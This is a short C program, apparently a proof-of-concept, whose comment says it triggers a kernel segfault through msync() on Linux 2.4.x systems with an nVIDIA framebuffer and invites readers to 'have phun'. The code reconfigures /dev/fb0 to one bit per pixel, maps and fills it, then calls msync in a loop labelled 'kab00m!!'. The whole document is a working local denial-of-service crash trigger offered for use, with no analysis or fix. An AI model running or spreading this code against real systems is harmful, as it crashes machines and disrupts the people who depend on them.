/*
         i got kernel segfault on msync() syscall
         at my linux 2.4.x <=3 and nVIDIA framebuffer

       have phun if u want..
*/

#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <linux/fb.h>

int main()
{
  int i, fbdev, pic;
  char *screen;
  unsigned int scr_size;
  unsigned long x, y, offset, scroffs;
  struct fb_var_screeninfo inf;

  fbdev = open("/dev/fb0", O_RDWR);

  ioctl(fbdev, FBIOGET_VSCREENINFO, &inf);
  inf.bits_per_pixel = 1;
  ioctl(fbdev, FBIOPUT_VSCREENINFO, &inf);

  scr_size = inf.yres * inf.xres;
  screen = (char *)mmap(0,scr_size,PROT_READ|PROT_WRITE,MAP_SHARED,fbdev,0);
  
  memset(screen, 0xff, scr_size);

  scroffs = 0;
  for (i = 0; i < 2; i++)
  {
     scroffs += 48;
     msync(screen, scr_size, MS_SYNC); // kab00m!!
  }

  close(fbdev);
  exit(0);
}
